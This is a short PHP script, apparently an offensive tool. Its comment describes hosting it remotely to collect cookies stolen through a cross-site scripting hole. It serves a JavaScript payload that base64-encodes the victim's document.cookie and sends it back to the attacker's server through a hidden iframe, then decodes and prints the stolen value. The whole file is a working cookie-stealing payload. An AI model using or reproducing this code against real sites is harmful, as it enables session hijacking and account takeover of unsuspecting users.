<?php
  // For hosting on a remote web service in order to post back cookies from a XSS vuln page
  // Either pull the cookie data out of logs or see the decoded cookie in the response if running a packet sniffer on the host
  $url = "http://".$_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
  echo "// $url\n";
  if( !isset( $_GET["c"] ) ){
?>
var url = "<?php echo $url; ?>?c=" + encodeURIComponent(btoa(document.cookie));
f = document.createElement('iframe');
f.src = url;
document.getElementsByTagName('body')[0].appendChild(f);
<?php }else{
  echo "/*\n".base64_decode( $_GET["c"] )."\n*/\n";
}?>
